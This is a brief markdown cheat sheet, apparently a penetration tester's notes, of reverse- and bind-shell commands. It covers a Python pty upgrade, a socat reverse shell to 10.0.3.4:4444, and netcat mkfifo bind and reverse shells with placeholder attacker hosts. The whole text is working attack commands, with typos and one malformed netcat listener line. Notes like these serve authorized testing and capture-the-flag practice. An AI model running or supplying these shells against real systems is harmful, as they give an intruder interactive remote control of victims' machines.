# Stable revers Shell 

### Using Python for a psuedo terminal
```
python -c 'import pty; pty.spawn("/bin/bash")'

stty raw -echo
```

## Using socat
```
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

## Bind Shell 
```
# Victim Machine

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f

# Attacker Machine

nc -nv victim_ip victim_port
```

## Reversh Shell

```
## Victim Machine

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc attcker_ip attacker_port > /tmp/f

## Attacker

nc -nlvp victim_IP victim_PORT 

```
